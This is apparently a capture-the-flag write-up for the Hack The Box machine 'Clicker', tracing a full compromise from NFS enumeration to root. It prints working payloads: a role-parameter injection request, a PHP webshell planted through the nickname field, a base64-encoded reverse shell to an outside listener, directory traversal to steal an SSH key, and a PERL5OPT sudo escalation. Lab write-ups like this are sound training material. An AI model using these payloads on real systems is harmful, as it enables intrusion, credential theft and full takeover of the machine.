---
title:  "HTB Clicker Writeup"
date:   2024-01-27 00:30:00 
categories: HTB Machine
tags: Crlf-Injection Directory-Traversal Webshell
---

![](https://cal1c0.github.io/assets/img/Clicker/1695303008085.jpg)

# Machine Info
Clicker is a Medium Linux box featuring a Web Application hosting a clicking game. Enumerating the box, an attacker is able to mount a public NFS share and retrieve the source code of the application, revealing an endpoint susceptible to SQL Injection. Exploiting this vulnerability, an attacker can elevate the privileges of their account and change the username to include malicious PHP code. Accessing the admin panel, an export feature is abused to create a PHP file including the modified username, leading to arbitrary code execution on the machine as `www-data`. Enumeration reveals an `SUID` binary that can access files under the home folder of the user `jack`. By performing a path traversal attack on the binary, the attacker is able to get the SSH key of `jack`, who is allowed to run a monitoring script with arbitrary environment variables with `sudo`. The monitoring script expects a response to a `curl` request in XML format. The attacker, by setting the `http_proxy` variable, is able to intercept and alter the response to the script, in order to include an XXE payload to read the SSH key of the `root` user. Finally, the attacker is able to use the SSH key and get access as the `root` user on the remote machine.
Related Academy Modules


## Shell as www-data

### Enumeration

`nmap -sC -sV -p- -T4 --min-rate=9326 --vv 10.10.11.232 | grep port  `    

```
Scanning 10.10.11.232 [2 ports]
Scanning clicker.htb (10.10.11.232) [65535 ports]
Discovered open port 80/tcp on 10.10.11.232
Discovered open port 22/tcp on 10.10.11.232
Discovered open port 111/tcp on 10.10.11.232
Discovered open port 36657/tcp on 10.10.11.232
Discovered open port 40287/tcp on 10.10.11.232
Warning: 10.10.11.232 giving up on port because retransmission cap hit (6).
Discovered open port 39515/tcp on 10.10.11.232
Discovered open port 59781/tcp on 10.10.11.232
Discovered open port 2049/tcp on 10.10.11.232
Discovered open port 38577/tcp on 10.10.11.232
```

### NFS SHARE
NFS : NFS, or Network File System, serves as a cross-platform protocol designed for sharing directories and files seamlessly across different operating systems over a network. This technology empowers remote systems to function as though they are local when the shared resources are mounted, granting users access based on the privileges assigned to each specific share. When NFS is improperly configured, it can potentially expose vulnerabilities that malicious actors may exploit to gain unauthorized access to sensitive data or even establish a shell on the target system.

`mkdir -p /mnt/nfs_file_shares`
`cd /mnt`
`mount -o nolock 10.10.11.232:/ /mnt/nfs_file_shares`
`cd nfs_file_shares/mnt/backups`

![](/images/clicker/2024-01-26-15-44-05.png)

Read-only acceptable on `/mnt` so we need move that zip to another directory



`cp clicker.htb_backup.zip /tmp`
`unzip clicker.htb_backup.zip`
`cd clicker.htb`

U can see here we have the source code on clicker.htb 

```
┌──(root㉿kali)-[/tmp/clicker.htb]
└─# ls
admin.php  authenticate.php   db_utils.php    export.php  index.php  login.php   play.php     register.php
assets     create_player.php  diagnostic.php  exports     info.php   logout.php  profile.php  save_game.php
```


![](/images/clicker/2024-01-26-15-48-12.png)

There have form register and login let's we create account and login . I've looked in `create_player.php` file Do not allow special character . 


![](/images/clicker/2024-01-26-15-53-15.png)

There just appearing profile , Logout and play let's we check play first . On `play.php` is clicker also have clicks numbers and levels . Now we'll try read source code in `play.php` 

![](/images/clicker/2024-01-26-16-17-40.png)

in `play.php` can modify your role user to superuser

### Crlf Injection

```
GET /save_game.php?clicks=2&level=0 HTTP/1.1

Host: clicker.htb

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Connection: close

Referer: http://clicker.htb/play.php

Cookie: PHPSESSID=voblvqcsb65iskh39749pk4fn1

Upgrade-Insecure-Requests: 1
```
U need some click to save it, and cann see there using `save_game.php`
go back to linux to read source code save_game.php



```
<?php
session_start();
include_once("db_utils.php");

if (isset($_SESSION['PLAYER']) && $_SESSION['PLAYER'] != "") {
	$args = [];
	foreach($_GET as $key=>$value) {
		if (strtolower($key) === 'role') {
			// prevent malicious users to modify role
			header('Location: /index.php?err=Malicious activity detected!');
			die;
		}
		$args[$key] = $value;
	}
	save_profile($_SESSION['PLAYER'], $_GET);
	// update session info
	$_SESSION['CLICKS'] = $_GET['clicks'];
	$_SESSION['LEVEL'] = $_GET['level'];
	header('Location: /index.php?msg=Game has been saved!');
	
}
?>
```
Here file the code see the `strtolower($key) === 'role')`
to modify role to user administrator the parameter is role , But something prevent to modify , if there is no obstacle you can modify role=Admin easily. But there is an obstacle we need bypass it.To knows role name you can check in `admin.php` file there used `Admin` Role 

```
if ($_SESSION["ROLE"] != "Admin") {
```

We try Crlf Injection to privilege escalation to Administrator


[Crlf Injection - Hacktricks](https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a)

Back to play.php to crlf injection it click some clickers and save the game with intercept burpsuite

Add this parameter role%0d%0a=Admin like this request below

```
GET /save_game.php?clicks=5&level=0&role%0d%0a=Admin HTTP/1.1

Host: clicker.htb

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Connection: close

Referer: http://clicker.htb/play.php

Cookie: PHPSESSID=voblvqcsb65iskh39749pk4fn1

Upgrade-Insecure-Requests: 1

```

Go back to index.php  to see if anything has changed but ... is not changed lol
we try relogin and we got access Administration Portal XD

![](/images/clicker/2024-01-26-16-22-21.png)

Administration was appended now we've privilege user to superuser


Go to Administration and we try export it 

### Manipulation export file

![](/images/clicker/2024-01-27-00-15-06.png)
Look here. I've shown you two tabs for browsers. There were only exports for the top players; Clicker only appeared. After I exported it, it was automatically saved as a txt file, and there were shown the directory name and file name.There are 3 extensions to save: `txt`, `json`, and `html`. Now let's export it with Capture in Burpsuite. 

![](/images/clicker/2024-01-27-00-23-18.png)

Look at the request on parameter 'extension'. There was a txt extension. I'll try changing the extension from txt to php because this website uses PHP, so I just want to see if it's working or not. So now I've changed `txt` to `php` and it was saved as php.

![](/images/clicker/2024-01-27-00-34-07.png)


### Create nickname malicious php code

It's changed to PHP code, so I'll try to put malicious code on the nickname and change the extension to PHP. But to create malicious code, we need to use special characters, but register.php does not accept special characters, so we need to use another way.







we need change it my nickname user using code php

Read the file authenticate.php
```
<?php
session_start();
include_once("db_utils.php");

if (isset($_POST['username']) && isset($_POST['password']) && $_POST['username'] != "" && $_POST['password'] != "") {
	if(check_auth($_POST['username'], $_POST['password'])) {
		$_SESSION["PLAYER"] = $_POST["username"];
		$profile = load_profile($_POST["username"]);
		$_SESSION["NICKNAME"] = $profile["nickname"];
		$_SESSION["ROLE"] = $profile["role"];
		$_SESSION["CLICKS"] = $profile["clicks"];
		$_SESSION["LEVEL"] = $profile["level"];
		header('Location: /index.php');
	}
	else {
		header('Location: /login.php?err=Authentication Failed');
	}
}
?>
```

```
`$_SESSION["NICKNAME"] = $profile["nickname"];` 
```
The param is `nickname` so we just append `nickname` on `play.php` to update our nickname with php malicious code


just we dont need bypass because role only need bypass because something prevent it .

`&nickname=<%3fphp+system($_GET['cmd'])+%3f>` just add this only at the param save_game.php this is code for remote code execution php . Decode the php code to url encode . To get top player in leaderboard clicker you can change your clicker to `999999999999` to appear in leaderboard . CREATE A NEW ACCOUNT AND CHANGE CLICKER NUMBER AND ADD CRLF INJECTION PAYLOAD TO MODIFY ROLE . AFTER THAT FORWARD AND DO IT AGAIN WITH ADD NICKNAME	, because i've did it all at once but it didn't work.


Now check in leaderboard

![](/images/clicker/2024-01-27-12-18-43.png)

Look here my name is blank because i've added php code malicious so now i'll change extension to php


### Remote Code Execution

![](/images/clicker/2024-01-27-12-21-25.png)

Add `&cmd=$COMMAND` because the webshell code is used `$GET_` cmd

To revshell we using echo command with base64 decode and bash to revshell

Without Url Encode
```
echo "c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTIyLzEzMzcgMD4mMQ==" | base64 -d | bash
```

With url encode
```
echo%20%22c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTIyLzEzMzcgMD4mMQ==%22%20|%20base64%20-d%20|%20bash
```

![](/images/clicker/2024-01-27-12-25-24.png)

There is base64 decode so to create a revshell payload you can generate here [Revshells](https://www.revshells.com/)
Change `bash` to `sh` 

## Shell as jack

```
─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.122] from (UNKNOWN) [10.10.11.232] 41614
sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 
```

Netcat was connected so now we just need get the user

```
$ cat /etc/passwd | grep /home
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
jack:x:1000:1000:jack:/home/jack:/bin/bash
```
Only jack user was registered on `/etc/passwd` i'll try find user group `jack` using find command

```
$ find / -group jack 2>/dev/null
/home/jack
/var/crash/_opt_manage_execute_query.1000.crash
/opt/manage
/opt/manage/README.txt
/opt/manage/execute_query
```
Now we goes to `/opt/manage` to get a password or priv8 keys 

There have a `README.txt` file maybe that is guide to using that tools

```
$ cat README.txt
Web application Management

Use the binary to execute the following task:
	- 1: Creates the database structure and adds user admin
	- 2: Creates fake players (better not tell anyone)
	- 3: Resets the admin password
	- 4: Deletes all users except the admin
```

### Directory Traversal

there is option to using the tools but no one option how to read the file because we need find the priv8 key

![](/images/clicker/2024-01-27-12-51-37.png)

I know now option number above 5 is using for read a file so now we can get priv8 keys jack because `execute_query` have permission as jack , but it's not working so i think we can read file with directory traversal lets we try


`./execute_query 5 ../../../etc/passwd`

![](/images/clicker/2024-01-27-12-56-23.png)

It's worked and there can read the `/etc/passwd` file so now we just try to get ssh key 


`./execute_query 5 ../.ssh/id_rsa`

![](/images/clicker/2024-01-27-12-57-40.png)

I've got priv8 key jack so now we just login

`chmod 600 id_rsa`

```
# ssh jack@clicker.htb -i id_rsa
Load key "id_rsa": error in libcrypto
jack@clicker.htb's password: 
```

The `id_rsa` it's error let's we check . We need to remove ----- on id_rsa and recreate this ----- line. the lines must have 5

`ssh -i id_rsa jack@clicker.htb`

![](/images/clicker/2024-01-27-13-07-59.png)

Successfully login now we try run `sudo -l` to see jack have permision root or not

## Shell as root

```
jack@clicker:~$ sudo -l
Matching Defaults entries for jack on clicker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jack may run the following commands on clicker:
    (ALL : ALL) ALL
    (root) SETENV: NOPASSWD: /opt/monitor.sh
```


```
// monitor.sh
#!/bin/bash
if [ "$EUID" -ne 0 ]
  then echo "Error, please run as root"
  exit
fi

set PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
unset PERL5LIB;
unset PERLLIB;

data=$(/usr/bin/curl -s http://clicker.htb/diagnostic.php?token=secret_diagnostic_token);
/usr/bin/xml_pp <<< $data;
if [[ $NOSAVE == "true" ]]; then
    exit;
else
    timestamp=$(/usr/bin/date +%s)
    /usr/bin/echo $data > /root/diagnostic_files/diagnostic_${timestamp}.xml
fi
```
After many inspections, I noticed that this file actually calls /usr/bin/echo and /usr/bin/xml_pp. /usr/bin/echo is a binary file and nothing special. But /usr/bin/xml_pp is using Perl script to run.

![](/images/clicker/2024-01-27-16-04-40.png)

There script are using perl . The vulnerability is `perl_startup` also we can execute this script with with root privileges , We can using perl_startup to execute command with root access

### Perl_startup

[Exploit-DB : Exim — ‘perl_startup’ Local Privilege Escalation](https://www.exploit-db.com/exploits/39702)

`sudo PERL5OPT=-d PERL5DB='exec "chmod u+s /bin/bash"' /opt/monitor.sh`

`bash -p`

```
id
uid=1000(jack) gid=1000(jack) euid=0(root) groups=1000(jack),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)
```

`echo 'root:123' | chpasswd --crypt-method SHA512`
`su root`
- password:123

```
root@clicker:/home/jack# id
uid=0(root) gid=0(root) groups=0(root)
```
